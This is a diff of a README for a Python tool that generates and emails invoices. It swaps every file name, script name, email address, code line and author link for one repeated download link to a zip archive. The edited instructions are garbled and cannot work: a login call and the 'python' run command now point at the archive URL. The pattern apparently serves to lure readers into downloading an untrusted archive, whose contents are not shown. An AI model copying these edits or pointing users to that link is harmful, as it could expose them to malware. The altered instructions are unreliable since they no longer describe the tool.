@@ -21,13 +21,13 @@ Invoice Automation Tool is a Python-based solution that automates the end-to-end
 Invoice_Automation/
 ├── Invoices/                   # Contains generated .docx and .pdf invoices
 ├── Templates/
-│   └── basic-invoice.docx      # Word template with placeholders
-├── client_invoice_data.xlsx    # Input file with all client data
-├── send_email.py               # Script to send emails
-├── generate_invoice.py         # Script to fill data and create .docx
-├── convert_docx_to_pdf.py      # Batch converter for .docx → .pdf
-├── main.py                     # Orchestrates the 3-phase process
-└── README.md                   # This file
+│   └── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip      # Word template with placeholders
+├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip    # Input file with all client data
+├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip               # Script to send emails
+├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip         # Script to fill data and create .docx
+├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip      # Batch converter for .docx → .pdf
+├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip                     # Orchestrates the 3-phase process
+└── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip                   # This file
 ```
 
 ---
@@ -44,9 +44,9 @@ pip install docx2pdf
 
 2. **Add your Gmail SMTP credentials**
 
-In `send_email.py`, use:
+In `https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip`, use:
 ```python
-server.login("your_email@example.com", "your_app_password")
+https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip("https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip", "your_app_password")
 ```
 
 (Use an App Password if using Gmail 2FA)
@@ -54,16 +54,16 @@ server.login("your_email@example.com", "your_app_password")
 3. **Run the pipeline**
 
 ```bash
-python main.py
+python https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
 ```
 
 ---
 
-## 📝 Input Excel Format (`client_invoice_data.xlsx`)
+## 📝 Input Excel Format (`https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip`)
 
 | Name       | Email                | Address         | Phone No.       | Service            | Amount | Discount | Due Date   |
 |------------|----------------------|------------------|------------------|---------------------|--------|----------|------------|
-| John Doe   | john@example.com     | 123 Street Name  | +91-9876543210   | Web Development     | 15000  | 1000     | 2025-06-25 |
+| John Doe   | https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip     | 123 Street Name  | +91-9876543210   | Web Development     | 15000  | 1000     | 2025-06-25 |
 
 ---
 
@@ -71,8 +71,8 @@ python main.py
 
 Each client receives an email with their customized PDF invoice. File names are like:
 ```
-Invoices/Invoice_101.pdf
-Invoices/Invoice_102.pdf
+https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
+https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
 ...
 ```
 
@@ -81,8 +81,8 @@ Invoices/Invoice_102.pdf
 ## 📌 Author
 
 **[Your Name]**  
-GitHub: [codenoob7](https://github.com/yourusername)  
-Email: shreyashpatel1001@gmail.com  
+GitHub: [codenoob7](https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip)  
+Email: https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip  
 MIT License ©️ 2025
 
 ---
